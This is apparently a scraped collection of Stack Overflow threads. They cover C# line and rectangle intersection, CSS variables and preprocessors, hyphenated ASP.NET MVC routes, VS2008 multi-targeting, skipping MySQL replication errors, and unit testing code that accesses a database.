        PointF p1;
        int n = polygon.Length;
        p1 = polygon[0];
        if (point == p1)
        {
            return Intersection.Tangent;
        }

        for (i = 1; i &lt;= n; i++)
        {
            PointF p2 = polygon[i % n];
            if (point == p2)
            {
                return Intersection.Tangent;
            }
            if (point.Y &gt; Math.Min(p1.Y, p2.Y))
            {
                if (point.Y &lt;= Math.Max(p1.Y, p2.Y))
                {
                    if (point.X &lt;= Math.Max(p1.X, p2.X))
                    {
                        if (p1.Y != p2.Y)
                        {
                            double xinters = (point.Y - p1.Y) * (p2.X - p1.X) / (p2.Y - p1.Y) + p1.X;
                            if (p1.X == p2.X || point.X &lt;= xinters)
                                counter++;
                        }
                    }
                }
            }
            p1 = p2;
        }

        return (counter % 2 == 1) ? Intersection.Containment : Intersection.None;
    }

    public static Intersection IntersectionOf(PointF point, Line line)
    {
        float bottomY = Math.Min(line.Y1, line.Y2);
        float topY = Math.Max(line.Y1, line.Y2);
        bool heightIsRight = point.Y &gt;= bottomY &amp;&amp;
                             point.Y &lt;= topY;
        //Vertical line, slope is divideByZero error!
        if (line.X1 == line.X2)
        {
            if (point.X == line.X1 &amp;&amp; heightIsRight)
            {
                return Intersection.Tangent;
            }
            else
            {
                return Intersection.None;
            }
        }
        float slope = (line.X2 - line.X1)/(line.Y2 - line.Y1);
        bool onLine = (line.Y1 - point.Y) == (slope*(line.X1 - point.X));
        if (onLine &amp;&amp; heightIsRight)
        {
            return Intersection.Tangent;
        }
        else
        {
            return Intersection.None;
        }
    }

}
</code></pre>
 <p>well, if it's 2-D, then all lines are on the only plane.</p>

<p>So this is basic 3-D geometry.  You should be able to do this with a straightforward equation.</p>

<p>Check out this page: <a href=""http://local.wasp.uwa.edu.au/~pbourke/geometry/planeline/"" rel=""nofollow"">http://local.wasp.uwa.edu.au/~pbourke/geometry/planeline/</a>  The second solution should be easy to implement in code, as long as you translate the coordinates of your rectangle into the equation of a plane.  </p>

<p>Check that your denominator isn't zero (line doesn't intersect or is contained in the plane) and you'll be good to go.</p>
 <p>I hate browsing the MSDN docs (they're awfully slow and weird :-s) but I think they should have something similar to <a href=""http://java.sun.com/j2se/1.4.2/docs/api/java/awt/geom/Rectangle2D.html#intersectsLine%28double,%20double,%20double,%20double%29"" rel=""nofollow"">this Java method</a>... and if they haven't, bad for them! XD (btw, it works for segments, not lines).</p>

<p>In any case, you can peek the open source Java SDK to see how is it implemented, maybe you'll learn some new trick (I'm always surprised when I look other people's code)</p>
 <p>since it is missing i'll just add it for completeness</p>

<pre><code>public static Intersection IntersectionOf(Line line1, Line line2)
    {
        //  Fail if either line segment is zero-length.
        if (line1.X1 == line1.X2 &amp;&amp; line1.Y1 == line1.Y2 || line2.X1 == line2.X2 &amp;&amp; line2.Y1 == line2.Y2)
            return Intersection.None;

        if (line1.X1 == line2.X1 &amp;&amp; line1.Y1 == line2.Y1 || line1.X2 == line2.X1 &amp;&amp; line1.Y2 == line2.Y1)
            return Intersection.Intersection;
        if (line1.X1 == line2.X2 &amp;&amp; line1.Y1 == line2.Y2 || line1.X2 == line2.X2 &amp;&amp; line1.Y2 == line2.Y2)
            return Intersection.Intersection;

        //  (1) Translate the system so that point A is on the origin.
        line1.X2 -= line1.X1; line1.Y2 -= line1.Y1;
        line2.X1 -= line1.X1; line2.Y1 -= line1.Y1;
        line2.X2 -= line1.X1; line2.Y2 -= line1.Y1;

        //  Discover the length of segment A-B.
        double distAB = Math.Sqrt(line1.X2 * line1.X2 + line1.Y2 * line1.Y2);

        //  (2) Rotate the system so that point B is on the positive X axis.
        double theCos = line1.X2 / distAB;
        double theSin = line1.Y2 / distAB;
        double newX = line2.X1 * theCos + line2.Y1 * theSin;
        line2.Y1 = line2.Y1 * theCos - line2.X1 * theSin; line2.X1 = newX;
        newX = line2.X2 * theCos + line2.Y2 * theSin;
        line2.Y2 = line2.Y2 * theCos - line2.X2 * theSin; line2.X2 = newX;

        //  Fail if segment C-D doesn't cross line A-B.
        if (line2.Y1 &lt; 0 &amp;&amp; line2.Y2 &lt; 0 || line2.Y1 &gt;= 0 &amp;&amp; line2.Y2 &gt;= 0)
            return Intersection.None;

        //  (3) Discover the position of the intersection point along line A-B.
        double posAB = line2.X2 + (line2.X1 - line2.X2) * line2.Y2 / (line2.Y2 - line2.Y1);

        //  Fail if segment C-D crosses line A-B outside of segment A-B.
        if (posAB &lt; 0 || posAB &gt; distAB)
            return Intersection.None;

        //  (4) Apply the discovered position to line A-B in the original coordinate system.
        return Intersection.Intersection;
    }
</code></pre>

<p>note that the method rotates the line segments so as to avoid direction-related problems</p>
 <p>Isn't it possible to check the line against each side of the rectangle using simple line segment formula.</p>
 <p>Use class:</p>

<pre><code>System.Drawing.Rectangle
</code></pre>

<p>Method:</p>

<pre><code>IntersectsWith();
</code></pre>
"
"Avoiding repeated constants in CSS <p>Are there any useful techniques for reducing the repetition of constants in a CSS file?</p>

<p>(For example, a bunch of different selectors which should all apply the same colour, or the same font size)?</p>
 <p>You can use multiple inheritance in your html elements (e.g. <code>&lt;div class=""one two""&gt;</code>) but I'm not aware of a way of having constants in the CSS files themselves.</p>

<p>This link (the first found when googling your question) seems to have a fairly indepth look at the issue:</p>

<p><a href=""http://icant.co.uk/articles/cssconstants/"" rel=""nofollow"">http://icant.co.uk/articles/cssconstants/</a></p>
 <p>You should comma seperate each id or class for example:</p>

<pre class=""lang-css prettyprint-override""><code>h1,h2 {
  color: #fff;
}
</code></pre>
 <p>As far as I know, without programmatically generating the CSS file, there's no way to, say, define your favorite shade of blue (#E0EAF1) in one and only one spot.</p>

<p>You could pretty easily write a computer program to generate the file.  Execute a simple find-and-replace operation and then save as a .css file.</p>

<p>Go from this source.css&hellip;</p>

<pre class=""lang-css prettyprint-override""><code>h1,h2 {
  color: %%YOURFAVORITECOLOR%%;
}

div.something {
  border-color: %%YOURFAVORITECOLOR%%;
}
</code></pre>

<p>to this target.css&hellip;</p>

<pre class=""lang-css prettyprint-override""><code>h1,h2 {
  color: #E0EAF1;
}

div.something {
  border-color: #E0EAF1;
}
</code></pre>

<p>with code like this&hellip; (VB.NET)</p>

<pre><code>Dim CssText As String = System.IO.File.ReadAllText(""C:\source.css"")
CssText = CssText.Replace(""%%YOURFAVORITECOLOR%%"", ""#E0EAF1"")
System.IO.File.WriteAllText(""C:\target.css"", CssText)
</code></pre>
 <p>Elements can belong to more than one class, so you can do something like this:  </p>

<pre><code>.DefaultBackColor
{
    background-color: #123456;
}
.SomeOtherStyle
{
    //other stuff here
}
.DefaultForeColor
{
    color:#654321;
}
</code></pre>

<p>And then in the content portion somewhere:  </p>

<pre><code>&lt;div class=""DefaultBackColor SomeOtherStyle DefaultForeColor""&gt;Your content&lt;/div&gt;
</code></pre>

<p>The weaknesses here are that it gets pretty wordy in the body and you're unlikely to be able to get it down to listing a color only once.  But you might be able to do it only two or three times and you can group those colors together, perhaps in their own sheet.  Now when you want to change the color scheme they're all together and the change is pretty simple.</p>

<p>But, yeah, my biggest complain with CSS is the inability to define your own constants.</p>
 <p>Personally, I just use comma-separed selector, but there some solution for writing css programmatically. Maybe this is a little overkill for you simpler needs, but take a look at <a href=""http://pypi.python.org/pypi/CleverCSS/"" rel=""nofollow"">CleverCSS</a> (Python)</p>
 <p><a href=""http://disruptive-innovations.com/zoo/cssvariables/"" rel=""nofollow"">CSS Variables</a>, if it ever becomes implemented in all major browsers, may one day resolve this issue.</p>

<p>Until then, you'll either have to copy and paste, or use a preprocessor of whatever sort, like others have suggested (typically using server-sider scripting).</p>
 <p>You can use dynamic css frameworks like <a href=""http://lesscss.org/"" rel=""nofollow"">less</a>.</p>
 <p>You can use global variables to avoid duplicacy. </p>

<pre><code>p{
  background-color: #ccc; 
}

h1{
  background-color: #ccc;
}
</code></pre>

<p>Here, you can initialize a global variable in <em>:root</em> pseudo class selector. <em>:root</em> is top level of the DOM.</p>

<pre><code>:root{
    --main--color: #ccc; 
}

p{
  background-color: var(--main-color);
}

h1{
  background-color: var(--main-color);
}
</code></pre>

<blockquote>
  <p>NOTE: This is an experimental technology
  Because this technology's specification has not stabilized, check the compatibility table for the proper prefixes to use in various browsers. Also note that the syntax and behavior of an experimental technology is subject to change in future versions of browsers as the spec changes.<a href=""https://developer.mozilla.org/en-US/docs/Web/CSS/Using_CSS_variables"" rel=""nofollow""> More Info here</a></p>
</blockquote>

<p>However, you can always use the Syntactically Awesome Style Sheets i.e. </p>

<p>In case Sass, you have to use $variable_name at the top to initialize the global variable.</p>

<pre><code>$base : #ccc;

p{
  background-color: $base;
}

h1{
   background-color: $base;
}
</code></pre>
 <p>Try Global variables to avoid duplicate coding</p>

<pre class=""lang-css prettyprint-override""><code>h1 {
  color: red;
}
p {
  font-weight: bold;
}
</code></pre>

<p>Or you can create different classes </p>

<pre class=""lang-css prettyprint-override""><code>.deflt-color {
  color: green;
}
.dflt-nrml-font {
  font-size: 12px;
}
.dflt-header-font {
  font-size: 18px;
}
</code></pre>
 <p>Recently, <a href=""https://www.w3.org/TR/css-variables/"" rel=""nofollow""><strong>variables have been added</strong></a> to the official CSS specs.</p>

<p>Variables allow you to so something like this :</p>

<p><div class=""snippet"" data-lang=""js"" data-hide=""false"">
<div class=""snippet-code"">
<pre class=""snippet-code-css lang-css prettyprint-override""><code>body, html {
    margin: 0;
    height: 100%;
}

.theme-default {
    --page-background-color: #cec;
    --page-color: #333;
    --button-border-width: 1px;
    --button-border-color: #333;
    --button-background-color: #f55;
    --button-color: #fff;
    --gutter-width: 1em;
    float: left;
    height: 100%;
    width: 100%;
    background-color: var(--page-background-color);
    color: var(--page-color);
}

button {
    background-color: var(--button-background-color);
    color: var(--button-color);
    border-color: var(--button-border-color);
    border-width: var(--button-border-width);
}

.pad-box {
    padding: var(--gutter-width);
}</code></pre>
<pre class=""snippet-code-html lang-html prettyprint-override""><code>&lt;div class=""theme-default""&gt;
    &lt;div class=""pad-box""&gt;
        &lt;p&gt;
            This is a test
        &lt;/p&gt;
        &lt;button&gt;
           Themed button
        &lt;/button&gt;
    &lt;/div&gt;
&lt;/div&gt;</code></pre>
</div>
</div>
</p>

<p>Unfortunately, browser support is still very poor. <a href=""http://caniuse.com/#feat=css-variables"" rel=""nofollow""><strong>According to CanIUse</strong></a>, the only browsers that support this feature today (march 9th, 2016), are Firefox 43+, Chrome 49+, Safari 9.1+ and iOS Safari 9.3+ :</p>

<p><a href=""http://i.stack.imgur.com/nRzFd.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/nRzFd.png"" alt=""enter image description here""></a></p>

<hr>

<h3>Alternatives :</h3>

<p>Until CSS variables are widely supported, you could consider using a CSS pre-processor language like <a href=""http://lesscss.org/"" rel=""nofollow""><strong>Less</strong></a> or <a href=""http://sass-lang.com/"" rel=""nofollow""><strong>Sass</strong></a>.</p>

<p>CSS pre-processors wouldn't just allow you to use variables, but pretty much allow you to do anything you can do with a programming language.</p>

<p>For example, in Sass, you could create a function like this  :</p>

<pre><code>@function exponent($base, $exponent) {
    $value: $base;
    @if $exponent &gt; 1 {
        @for $i from 2 through $exponent {
            $value: $value * $base;
        }
    }
    @if $exponent &lt; 1 {
        @for $i from 0 through -$exponent {
            $value: $value / $base;
        }
    }
    @return $value; 
}
</code></pre>
 <pre><code>    :root {
      --primary-color: red;
    }

    p {
      color: var(--primary-color);
    } 

&lt;p&gt; some red text &lt;/p&gt;
</code></pre>

<p>You can change color by JS</p>

<pre><code>var styles = getComputedStyle(document.documentElement);
var value = String(styles.getPropertyValue('--primary-color')).trim(); 


document.documentElement.style.setProperty('--primary-color', 'blue');
</code></pre>
"
"Asp.Net MVC: How do I enable dashes in my urls? <p>I'd like to have dashes separate words in my URLs.  So instead of:</p>

<pre><code>/MyController/MyAction
</code></pre>

<p>I'd like:</p>

<pre><code>/My-Controller/My-Action
</code></pre>

<p>Is this possible?</p>
 <p>You could write a custom route that derives from the Route class GetRouteData to strip dashes, but when you call the APIs to generate a URL, you'll have to remember to include the dashes for action name and controller name.</p>

<p>That shouldn't be too hard.</p>
 <p>You can use the ActionName attribute like so:</p>

<pre><code>[ActionName(""My-Action"")]
public ActionResult MyAction() {
    return View();
}
</code></pre>

<p>Note that you will then need to call your View file ""My-Action.cshtml"" (or appropriate extension). You will also need to reference ""my-action"" in any Html.ActionLink methods.</p>

<p>There isn't such a simple solution for controllers.</p>

<h2>Edit: Update for MVC5</h2>

<p>Now with MVC5, Attribute Routing has been absorbed into the project. You can now use:</p>

<pre><code>[Route(""My-Action"")]
</code></pre>

<p>On Action Methods. </p>

<p>For controllers, you can apply a <code>RoutePrefix</code> attribute which will be applied to all action methods in that controller:</p>

<pre><code>[RoutePrefix(""my-controller"")]
</code></pre>

<p>One of the benefits of using <code>RoutePrefix</code> is URL parameters will also be passed down to any action methods.</p>

<pre><code>[RoutePrefix(""clients/{clientId:int}"")]
public class ClientsController : Controller .....
</code></pre>

<p>Snip..</p>

<pre><code>[Route(""edit-client"")]
public ActionResult Edit(int clientId) // will match /clients/123/edit-client
</code></pre>
 <p>You could create a custom route handler as shown in this blog:</p>

<p><a href=""http://blog.didsburydesign.com/2010/02/how-to-allow-hyphens-in-urls-using-asp-net-mvc-2/"">http://blog.didsburydesign.com/2010/02/how-to-allow-hyphens-in-urls-using-asp-net-mvc-2/</a></p>

<pre><code>public class HyphenatedRouteHandler : MvcRouteHandler{
        protected override IHttpHandler  GetHttpHandler(RequestContext requestContext)
        {
            requestContext.RouteData.Values[""controller""] = requestContext.RouteData.Values[""controller""].ToString().Replace(""-"", ""_"");
            requestContext.RouteData.Values[""action""] = requestContext.RouteData.Values[""action""].ToString().Replace(""-"", ""_"");
            return base.GetHttpHandler(requestContext);
        }
    }
</code></pre>

<p>...and the new route:</p>

<pre><code>routes.Add(
            new Route(""{controller}/{action}/{id}"", 
                new RouteValueDictionary(
                    new { controller = ""Default"", action = ""Index"", id = """" }),
                    new HyphenatedRouteHandler())
        );
</code></pre>

<p>A very similar question was asked here: <a href=""http://stackoverflow.com/questions/2070890/asp-net-mvc-support-for-urls-with-hyphens"">ASP.net MVC support for URL's with hyphens</a></p>
 <p>You can define a specific route such as:</p>

<pre><code>routes.MapRoute(
    ""TandC"", // Route controllerName
    ""CommonPath/{controller}/Terms-and-Conditions"", // URL with parameters
    new {
        controller = ""Home"",
        action = ""Terms_and_Conditions""
    } // Parameter defaults
);
</code></pre>

<p>But this route has to be registered <strong>BEFORE</strong> your default route.</p>
 <p>If you have access to the IIS URL Rewrite module ( <a href=""http://blogs.iis.net/ruslany/archive/2009/04/08/10-url-rewriting-tips-and-tricks.aspx"" rel=""nofollow"">http://blogs.iis.net/ruslany/archive/2009/04/08/10-url-rewriting-tips-and-tricks.aspx</a> ), you can simply rewrite the URLs.</p>

<p>Requests to /my-controller/my-action can be rewritten to /mycontroller/myaction and then there is no need to write custom handlers or anything else.  Visitors get pretty urls and you get ones MVC can understand.</p>

<p>Here's an example for one controller and action, but you could modify this to be a more generic solution:</p>

<pre><code>&lt;rewrite&gt;
  &lt;rules&gt;
    &lt;rule name=""Dashes, damnit""&gt;
      &lt;match url=""^my-controller(.*)"" /&gt;
      &lt;action type=""Rewrite"" url=""MyController/Index{R:1}"" /&gt;
    &lt;/rule&gt;
  &lt;/rules&gt;
&lt;/rewrite&gt;
</code></pre>

<p>The possible downside to this is you'll have to switch your project to use IIS Express or IIS for rewrites to work during development.</p>
 <p>I'm still pretty new to MVC, so take it with a grain of salt.  It's not an elegant, catch-all solution but did the trick for me in MVC4:</p>

<pre class=""lang-cs prettyprint-override""><code>routes.MapRoute(
    name: ""ControllerName"",
    url: ""Controller-Name/{action}/{id}"",
    defaults: new { controller = ""ControllerName"", action = ""Index"", id = UrlParameter.Optional }
);
</code></pre>
 <p>I've developed an open source <strong>NuGet library</strong> for this problem which implicitly converts EveryMvc/Url to every-mvc/url. </p>

<p>Uppercase urls are problematic because cookie paths are case-sensitive, most of the internet is actually case-sensitive while Microsoft technologies treats urls as case-insensitive. (<a href=""http://www.ata.io/lowercase-dashed-route/"">More on my blog post</a>)</p>

<p>NuGet Package: <a href=""https://www.nuget.org/packages/LowercaseDashedRoute/"">https://www.nuget.org/packages/LowercaseDashedRoute/</a></p>

<p>To install it, simply open the NuGet window in the Visual Studio by right clicking the Project and selecting NuGet Package Manager, and on the ""Online"" tab type ""Lowercase Dashed Route"", and it should pop up.</p>

<p>Alternatively, you can run this code <strong>in the Package Manager Console:</strong></p>

<p><code>Install-Package LowercaseDashedRoute</code></p>

<p>After that you should open App_Start/RouteConfig.cs and comment out existing route.MapRoute(...) call and add this instead:</p>

<pre><code>routes.Add(new LowercaseDashedRoute(""{controller}/{action}/{id}"",
  new RouteValueDictionary(
    new { controller = ""Home"", action = ""Index"", id = UrlParameter.Optional }),
    new DashedRouteHandler()
  )
);
</code></pre>

<p>That's it. All the urls are lowercase, dashed, and converted implicitly without you doing anything more.</p>

<p>Open Source Project Url: <a href=""https://github.com/AtaS/lowercase-dashed-route"">https://github.com/AtaS/lowercase-dashed-route</a></p>
 <p>Asp.Net MVC 5 will support attribute routing, allowing more explicit control over route names. Sample usage will look like:</p>

<pre><code>[RoutePrefix(""dogs-and-cats"")]
public class DogsAndCatsController : Controller
{
    [HttpGet(""living-together"")]
    public ViewResult LivingTogether() { ... }

    [HttpPost(""mass-hysteria"")]
    public ViewResult MassHysteria() { }
}
</code></pre>

<p>To get this behavior for projects using Asp.Net MVC prior to v5, similar functionality can be found with the <a href=""http://attributerouting.net/"" rel=""nofollow"">AttributeRouting project</a> (also <a href=""http://www.nuget.org/packages/AttributeRouting/"" rel=""nofollow"">available as a nuget</a>). In fact, Microsoft reached out to the author of AttributeRouting to help them with their implementation for MVC 5.</p>
 <p>Here's what I did using areas in ASP.NET MVC 5 and it worked liked a charm. I didn't have to rename my views, either.</p>

<p>In RouteConfig.cs, do this:</p>

<pre><code> public static void RegisterRoutes(RouteCollection routes)
    {
        // add these to enable attribute routing and lowercase urls, if desired
        routes.MapMvcAttributeRoutes();
        routes.LowercaseUrls = true;

        // routes.MapRoute...
    }
</code></pre>

<p>In your controller, add this before your class definition:</p>

<pre><code>[RouteArea(""SampleArea"", AreaPrefix = ""sample-area"")]
[Route(""{action}"")]
public class SampleAreaController: Controller
{
    // ...

    [Route(""my-action"")]
    public ViewResult MyAction()
    {
        // do something useful
    }
}
</code></pre>

<p>The URL that shows up in the browser if testing on local machine is: <strong>localhost/sample-area/my-action</strong>. You don't need to rename your view files or anything. I was quite happy with the end result.</p>

<p>After routing attributes are enabled you can delete any area registration files you have such as SampleAreaRegistration.cs.</p>

<p>This <a href=""http://blogs.msdn.com/b/webdev/archive/2013/10/17/attribute-routing-in-asp-net-mvc-5.aspx"" rel=""nofollow"">article</a> helped me come to this conclusion. I hope it is useful to you.</p>
"
"Moving from Visual Studio 2005 to 2008 and .NET 2.0 <p>I'm currently using VS2005 Profesional and .NET 2.0, and since our project is rather large (25 projects in the solution), I'd like to try VS 2008, since its theoretically faster with larger projects. </p>

<p>Before doing such thing, i'd like to know if what I've read is true: can I use VS2008 in "".net 2.0"" mode? I don't want my customers to install .net 3.0 or .3.5, I just want to install VS2008, open my solution and start working from there. </p>

<p>Is this possible?</p>

<p>P.D.: the solution is a c# Window Forms project.</p>
 <p>yes, vs2008 can ""<a href=""http://weblogs.asp.net/scottgu/archive/2007/06/20/vs-2008-multi-targeting-support.aspx"" rel=""nofollow"">target</a>"" a framework, but i think by default, if converting from vs2005 - vs2008 it just keeps it at framework 2.0</p>
 <p>It is possible to have a 2.0 project in VS 2008. You would just target .NET Framework 2.0 under the project properties.</p>

<p>Your solution will have to be converted to a VS9 solution however.</p>
 <p>Yes you can run 2.0 with VS2008.  Be sure to select that when you convert, however.  When converting a project, I mistakenly left in the ASP.NET 3.5 conversion, and then all new files contained references to Linq, so it was a little bit of a pain to switch back to 2.0 when I realized the mistake.</p>
 <p>Yes it's possible.  In the project properties you can target different versions of the .Net Framework going back to .NET 2.0.</p>

<p>Upgrading to VS 2008 will upgrade your Solution file and you won't be able to go back to VS 2005 unless you have backed up your solution</p>
 <p>Yes, the feature that enables this is Visual Studio 2008 is called multi-targeting. See <a href=""http://weblogs.asp.net/scottgu/archive/2007/06/20/vs-2008-multi-targeting-support.aspx"" rel=""nofollow"">this link</a> for more information. To use it you simply open the Properties for your Project, and select the Target Framework you want from the drop-down list on that page.</p>
 <p>And bear in mind that all this stuff about the <em>projects</em> being compatible between 2005 and 2008 is NOT true for C/C++ projects.  </p>
 <p>I had absolutely no problems switching to VS2008. :) Multi-targeting worked without a hitch.</p>
"
"MySQL Binary Log Replication: Can it be set to ignore errors? <p>I'm running a master-slave MySQL binary log replication system (phew!) that, for some data, is not in sync (meaning, the master holds more data than the slave). But the slave stops very frequently on the slightest MySQL error, can this be disabled? (perhaps a my.cnf setting for the replicating slave ignore-replicating-errors or some of the sort ;) )</p>

<p>This is what happens, every now and then, when the slave tries to replicate an item that does not exist, the slave just dies. a quick check at <strong>SHOW SLAVE STATUS \G;</strong> gives</p>

<pre><code>       Slave-IO-Running: Yes
      Slave-SQL-Running: No
        Replicate-Do-DB: 
             Last-Errno: 1062
             Last-Error: Error 'Duplicate entry '15218' for key 1' on query. Default database: 'db'. Query: 'INSERT INTO db.table ( FIELDS ) VALUES ( VALUES )'
</code></pre>

<p>which I promptly fix (once I realize that the slave has been stopped) by doing the following:</p>

<pre><code>STOP SLAVE;
RESET SLAVE;
START SLAVE;
</code></pre>

<p>... lately this has been getting kind of tiresome, and before I spit out some sort of PHP which does this for me, i was wondering if there's some my.cnf entry which will not kill the slave on the first error.</p>

<p>Cheers,</p>

<p>/mp</p>
 <p>First, do you really want to ignore errors? If you get an error, it is likely that the data is not in sync any more. Perhaps what you want is to drop the slave database and restart the sync process when you get an error.</p>

<p>Second, I think the error you are getting is not when you replicate an item that does not exist (what would that mean anyway?) - it looks like you are replicating an item that already exists in the slave database.</p>

<p>I suspect the problem mainly arises from not starting at a clean data copy. It seems that the master has been copied to the slave; then replication has been turned off (or failed); and then it has started up again, but without giving the slave the chance to catch up with what it missed.</p>

<p>If you ever have a time when the master can be closed for write access long enough to clone the database and import it into the slave, this might get the problems to go away.</p>
 <p>Modern <code>mysqldump</code> commands have a couple options to help with setting up consistent replication. Check out <code>--master-data</code> which will put the binary log file and position in the dump and automatically set when loaded into slave. Also <code>--single-transaction</code> will do the dump inside a transaction so that no write lock is needed to do a consistent dump.</p>
 <p>Yes, with --slave-skip-errors=xxx in my.cnf, where xxx is 'all' or a comma sep list of error codes.</p>
 <p>If the slave isn't used for any writes other than the replication, the authors of High Performance MySQL recommend adding <code>read_only</code> on the slave server to prevent users from mistakenly changing data on the slave as this is will also create the same errors you experienced. </p>
 <p>i think you are doing replication with out sync the database first sync the database and try for replication and servers are generating same unique ids and try to set auto incerment offset</p>
 <p>stop slave; set global sql_slave_skip_counter=1; start slave;</p>

<p>You can ignore only the current error and continue the replication process.</p>
"
"How to unit test an object with database queries <p>I've heard that unit testing is ""totally awesome"", ""really cool"" and ""all manner of good things"" but 70% or more of my files involve database access (some read and some write) and I'm not sure how to write a unit test for these files.</p>

<p>I'm using PHP and Python but I think it's a question that applies to most/all languages that use database access.</p>
 <p>Ideally, your objects should be persistent ignorant. For instance, you should have a ""data access layer"", that you would make requests to, that would return objects. This way, you can leave that part out of your unit tests, or test them in isolation.</p>

<p>If your objects are tightly coupled to your data layer, it is difficult to do proper unit testing. the first part of unit test, is ""unit"". All units should be able to be tested in isolation.</p>

<p>In my c# projects, I use NHibernate with a completely seperate Data layer. My objects live in the core domain model and are accessed from my application layer. The application layer talks to both the data layer and the domain model layer.</p>

<p>The application layer is also sometimes called the ""Business Layer"".</p>

<p>If you are using PHP, create a specific set of classes for <strong>ONLY</strong> data access. Make sure your objects have no idea how they are persisted and wire up the two in your application classes.</p>

<p>Another option would be to use mocking/stubs.</p>
 <p>You should mock the database access if you want to unit test your classes. After all, you don't want to test the database in a unit test. That would be an integration test. </p>

<p>Abstract the calls away and then insert a mock that just returns the expected data. If your classes don't do more than executing queries, it may not even be worth testing them, though...</p>
 <p>I usually try to break up my tests between testing the objects (and ORM, if any) and testing the db.  I test the object-side of things by mocking the data access calls whereas I test the db side of things by testing the object interactions with the db which is, in my experience, usually fairly limited.</p>

<p>I used to get frustrated with writing unit tests until I start mocking the data access portion so I didn't have to create a test db or generate test data on the fly.  By mocking the data you can generate it all at run time and be sure that your objects work properly with known inputs.</p>
 <p>You could use <strong>mocking frameworks</strong> to abstract out the database engine. I don't know if PHP/Python got some but for typed languages (C#, Java etc.) there are plenty of choices</p>

<p>It also depends on how you designed those database access code, because some design are easier to unit test than other like the earlier posts have mentioned.</p>
 <p>I've never done this in PHP and I've never used Python, but what you want to do is mock out the calls to the database.  To do that you can implement some <a href=""http://en.wikipedia.org/wiki/Inversion_of_Control"" rel=""nofollow"">IoC</a> whether 3rd party tool or you manage it yourself, then you can implement some mock version of the database caller which is where you will control the outcome of that fake call.</p>

<p>A simple form of IoC can be performed just by coding to Interfaces. This requires some kind of object orientation going on in your code so it may not apply to what your doing (I say that since all I have to go on is your mention of PHP and Python)</p>

<p>Hope that's helpful, if nothing else you've got some terms to search on now.</p>
 <p>I agree with the first post - database access should be stripped away into a DAO layer that implements an interface.  Then, you can test your logic against a stub implementation of the DAO layer.</p>
 <p>The book <a href=""http://rads.stackoverflow.com/amzn/click/0131495054"" rel=""nofollow"">xUnit Test Patterns</a> describes some ways to handle unit-testing code that hits a database.  I agree with the other people who are saying that you don't want to do this because it's slow, but you gotta do it sometime, IMO.  Mocking out the db connection to test higher-level stuff is a good idea, but check out this book for suggestions about things you can do to interact with the actual database.</p>
 <p>Unit testing your database access is easy enough if your project has high cohesion and loose coupling throughout.  This way you can test only the things that each particular class does without having to test everything at once.  </p>

<p>For example, if you unit test your user interface class the tests you write should only try to verify the logic inside the UI worked as expected, not the business logic or database action behind that function.  </p>

<p>If you want to unit test the actual database access you will actually end up with more of an integration test, because you will be dependent on the network stack and your database server, but you can verify that your SQL code does what you asked it to do.</p>

<p>The hidden power of unit testing for me personally has been that it forces me to design my applications in a much better way than I might without them.  This is because it really helped me break away from the ""this function should do everything"" mentality.</p>

<p>Sorry I don't have any specific code examples for PHP/Python, but if you want to see a .NET example I have a <a href=""http://stackoverflow.com/questions/12374/has-anyone-had-any-success-in-unit-testing-sql-stored-procedures#25204"" rel=""nofollow"">post</a> that describes a technique I used to do this very same testing.</p>
 <p>Options you have:</p>

<ul>
<li>Write a script that will wipe out database before you start unit tests, then populate db with predefined set of data and run the tests. You can also do that before every test &ndash; it'll be slow, but less error prone.</li>
<li><p>Inject the database. (Example in pseudo-Java, but applies to all OO-languages) <pre>
class Database {
 public Result query(String query) {... real db here ...}
}</p>

<p>class MockDatabase extends Database {
  public Result query(String query) { 
    return ""mock result""; 
  }
}</p>

<p>class ObjectThatUsesDB {
 public ObjectThatUsesDB(Database db) { 
   this.database = db; 
 }
}
</pre>
now in production you use normal database and for all tests you just inject the mock database that you can create ad hoc.</p></li>
<li>Do not use DB at all throughout most of code (that's a bad practice anyway). Create a ""database"" object that instead of returning  with results will return normal objects (i.e. will return <code>User</code> instead of a tuple <code>{name: ""marcin"", password: ""blah""}</code>) write all your tests with ad hoc constructed <em>real</em> objects and write one big test that depends on a database that makes sure this conversion works OK.</li>
</ul>

<p>Of course these approaches are not mutually exclusive and you can mix and match them as you need. </p>
 <p>The easiest way to unit test an object with database access is using transaction scopes. </p>

<p>For example:</p>

<pre><code>    [Test]
	[ExpectedException(typeof(NotFoundException))]
	public void DeleteAttendee() {

		using(TransactionScope scope = new TransactionScope()) {
			Attendee anAttendee = Attendee.Get(3);
			anAttendee.Delete();
			anAttendee.Save();

			//Try reloading. Instance should have been deleted.
			Attendee deletedAttendee = Attendee.Get(3);
		}
	}
</code></pre>

<p>This will revert back the state of the database, basically like a transaction rollback so you can run the test as many times as you want without any sideeffects. We've used this approach successfully in large projects. Our build does take a little long to run (15 minutes), but it is not horrible for having 1800 unit tests. Also, if build time is a concern, you can change the build process to have multiple builds, one for building src, another that fires up afterwards that handles unit tests, code analysis, packaging, etc...</p>
 <p>I would suggest mocking out your calls to the database.  Mocks are basically objects that look like the object you are trying to call a method on, in the sense that they have the same properties, methods, etc. available to caller.  But instead of performing whatever action they are programmed to do when a particular method is called, it skips that altogether, and just returns a result. That result is typically defined by you ahead of time.  </p>

<p>In order to set up your objects for mocking, you probably need to use some sort of inversion of control/ dependency injection pattern, as in the following pseudo-code:</p>

<pre><code>class Bar
{
    private FooDataProvider _dataProvider;

    public instantiate(FooDataProvider dataProvider) {
        _dataProvider = dataProvider;
    }

    public getAllFoos() {
        // instead of calling Foo.GetAll() here, we are introducing an extra layer of abstraction
        return _dataProvider.GetAllFoos();
    }
}

class FooDataProvider
{
    public Foo[] GetAllFoos() {
        return Foo.GetAll();
    }
}
</code></pre>

<p>Now in your unit test, you create a mock of FooDataProvider, which allows you to call the method GetAllFoos without having to actually hit the database.</p>

<pre><code>class BarTests
{
    public TestGetAllFoos() {
        // here we set up our mock FooDataProvider
        mockRepository = MockingFramework.new()
        mockFooDataProvider = mockRepository.CreateMockOfType(FooDataProvider);

        // create a new array of Foo objects
        testFooArray = new Foo[] {Foo.new(), Foo.new(), Foo.new()}

        // the next statement will cause testFooArray to be returned every time we call FooDAtaProvider.GetAllFoos,
        // instead of calling to the database and returning whatever is in there
        // ExpectCallTo and Returns are methods provided by our imaginary mocking framework
        ExpectCallTo(mockFooDataProvider.GetAllFoos).Returns(testFooArray)

        // now begins our actual unit test
        testBar = new Bar(mockFooDataProvider)
        baz = testBar.GetAllFoos()

        // baz should now equal the testFooArray object we created earlier
        Assert.AreEqual(3, baz.length)
    }
}
</code></pre>

